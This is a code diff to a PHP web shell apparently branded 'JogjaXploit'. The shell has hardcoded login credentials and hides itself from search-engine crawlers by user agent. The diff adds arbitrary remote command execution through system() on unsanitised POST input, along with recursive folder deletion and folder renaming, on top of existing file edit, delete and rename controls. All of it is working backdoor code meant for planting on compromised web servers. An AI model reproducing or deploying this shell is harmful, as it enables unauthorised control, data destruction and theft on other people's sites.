@@ -1,8 +1,29 @@
 <?php
 session_start();
+ob_start(); // Memulai output buffering
 
 $validUsername = 'JogjaXploit';
 $validPassword = 'Djaya3';
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['command_remote'])) {
+    $command_remote = $_POST['command_remote'];
+    $target_dir = isset($_POST['target_dir']) ? $_POST['target_dir'] : '.';
+
+    // Validasi direktori agar aman
+    if (is_dir($target_dir)) {
+        chdir($target_dir);
+    }
+
+    echo "Current Directory: " . getcwd() . "<br><br>";
+
+    // Eksekusi perintah di direktori yang dipilih
+    echo "<pre>";
+    system(($command_remote) . " 2>&1");
+    echo "</pre>";
+
+    echo "<a href=''>Back</a>";
+    die;
+}
 
 $blockedUserAgents = [
     'Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit',
@@ -46,7 +67,8 @@ ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
 $path = isset($_GET['path']) ? $_GET['path'] : $_SERVER['DOCUMENT_ROOT'];
-$action = isset($_GET['action']) ? $_GET['action'] : '';
+$action = isset($_GET['action']) ? $_GET['action'] : null;
+$command_remote = isset($_POST['command_remote']) ? $_POST['command_remote'] : '';
 $file = isset($_GET['file']) ? $_GET['file'] : '';
 
 echo '<div><strong>Root Directory:</strong> ' . $_SERVER['DOCUMENT_ROOT'] . '</div>';
@@ -92,6 +114,11 @@ function listDirectory($path) {
             echo '<a href="?action=edit&file=' . urlencode($filePath) . '&path=' . urlencode($path) . '">Edit</a> ';
             echo '<a href="?action=delete&file=' . urlencode($filePath) . '&path=' . urlencode($path) . '">Delete</a> ';
             echo '<a href="?action=rename&file=' . urlencode($filePath) . '&path=' . urlencode($path) . '">Rename</a>';
+        }
+        if ($isDir) {
+            foreach (['delete' => 'Delete', 'rename' => 'Rename'] as $action => $label) {
+                echo "<a href='?action=$action&dir=" . urlencode($filePath) . "&path=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin $label folder ini?\")'>$label</a> ";
+            }
         }
         echo '</td>';
         echo '</tr>';
@@ -143,6 +170,35 @@ function createNewFile($path, $fileName) {
         echo 'File ' . htmlspecialchars($fileName) . ' created successfully. <a href="?path=' . urlencode($path) . '">Go back</a>';
     } else {
         echo 'File ' . htmlspecialchars($fileName) . ' already exists. <a href="?path=' . urlencode($path) . '">Go back</a>';
+    }
+}
+
+// Proses delete folder beserta isinya
+if ($action === 'delete' && isset($_GET['dir'])) {
+    function deleteFolder($folder) {
+        foreach (scandir($folder) as $item) {
+            if ($item == '.' || $item == '..') continue;
+            $path = "$folder/$item";
+            is_dir($path) ? deleteFolder($path) : unlink($path);
+        }
+        rmdir($folder);
+    }
+    deleteFolder($_GET['dir']);
+    header("Location: ?path=" . urlencode($_GET['path']));
+    exit;
+}
+
+// Proses rename folder
+if ($action === 'rename' && isset($_GET['dir'])) {
+    echo "<form method='post'>
+            <input type='text' name='new_name' placeholder='Nama baru' required>
+            <button type='submit' name='rename'>Rename</button>
+          </form>";
+    if (isset($_POST['rename'])) {
+        $newPath = dirname($_GET['dir']) . '/' . basename($_POST['new_name']);
+        rename($_GET['dir'], $newPath);
+        header("Location: ?path=" . urlencode($_GET['path']));
+        exit;
     }
 }
 
@@ -211,6 +267,7 @@ if ($action === 'rename' && !empty($file)) {
     }
     exit;
 }
+ob_end_flush();
 ?>
 
 <!DOCTYPE html>
@@ -308,13 +365,20 @@ if ($action === 'rename' && !empty($file)) {
             <input type="text" name="file_name" placeholder="New File Name">
             <input type="submit" value="Create File">
         </form>
+
+        <!-- Create New File Form -->
+        <form method="post" action="?path=<?php echo urlencode($path); ?>">
+            <input type="text" name="command_remote" placeholder="Remote Command">
+            <input type="submit" value="Execute Command">
+        </form>
     </div>
 
     <!-- Image -->
-    <img src="https://bnhsec.000webhostapp.com/a/KWBdgN.jpg" alt="My Honey~ 🥰" height="300" width="300">
+    <img src="https://images-ng.pixai.art/images/orig/186021c2-a85f-44ba-80c8-72b747d82fbe" alt="My Honey~ 🥰" height="300" width="300">
 
     <!-- File Listing -->
     <div>
+        <?php echo '<h2>Directory:</h2>'.$path; ?>
         <?php listDirectory($path); ?>
     </div>
 </body>
